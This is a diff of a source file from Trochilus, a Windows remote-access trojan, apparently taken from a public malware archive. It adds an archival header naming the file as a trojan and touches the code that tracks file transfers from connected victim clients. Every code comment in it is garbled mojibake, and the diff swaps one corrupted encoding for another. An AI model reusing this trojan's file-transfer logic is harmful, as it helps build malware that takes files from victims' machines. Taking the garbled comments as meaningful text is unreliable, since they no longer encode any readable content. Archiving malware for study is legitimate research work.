@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "StdAfx.h"
 #include "FileTransfer.h"
 #include "CommManager.h"
@@ -72,7 +83,7 @@ BOOL CFileTransfer::MsgHandler_GetFile_Proc(MSGID msgid, const CommData& commDat
 
 		UpdateTransferList(commData.GetClientID(),status);
 
-		//Íê³ÉÔòÍ£Ö¹ÇëÇó
+		//ï¿½ï¿½ï¿½ï¿½ï¿½Í£Ö¹ï¿½ï¿½ï¿½ï¿½
 		if ( offset == FileSize )
 			break;
 
@@ -325,12 +336,12 @@ void CFileTransfer::UpdateTransferList( LPCTSTR clientid,TRANS_STATUS& status )
 		{
 			ProcessMap::iterator it1 = m_processMap.find(clientid);
 
-			//²éÕÒÊÇ·ñ´æÔÚ¶ÔÓ¦clientidµÄlist
+			//ï¿½ï¿½ï¿½ï¿½ï¿½Ç·ï¿½ï¿½ï¿½Ú¶ï¿½Ó¦clientidï¿½ï¿½list
 			if (it1 != m_processMap.end())
 			{
 				TransStatusVector &list = m_processMap[clientid];
 
-				//µü´ú²éÕÒ·ûºÏÌõ¼þµÄ
+				//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ò·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 				TransStatusVector::iterator it2 = list.begin();
 
 				for (; it2 != list.end(); it2++)
@@ -342,7 +353,7 @@ void CFileTransfer::UpdateTransferList( LPCTSTR clientid,TRANS_STATUS& status )
 					}
 				}
 
-				//Ã»ÓÐ·ûºÏÌõ¼þµÄ¾ÍÌí¼Ó
+				//Ã»ï¿½Ð·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¾ï¿½ï¿½ï¿½ï¿½ï¿½
 				if (it2 == list.end())
 				{
 					for(int i = 0 ; i <= 10000 ; i++)
@@ -355,7 +366,7 @@ void CFileTransfer::UpdateTransferList( LPCTSTR clientid,TRANS_STATUS& status )
 					}
 				}
 			}
-			//Èç¹ûlist²»´æÔÚ£¬ÔòÌí¼Ó 
+			//ï¿½ï¿½ï¿½listï¿½ï¿½ï¿½ï¿½ï¿½Ú£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ 
 			else
 			{
 				TransStatusVector newlist;
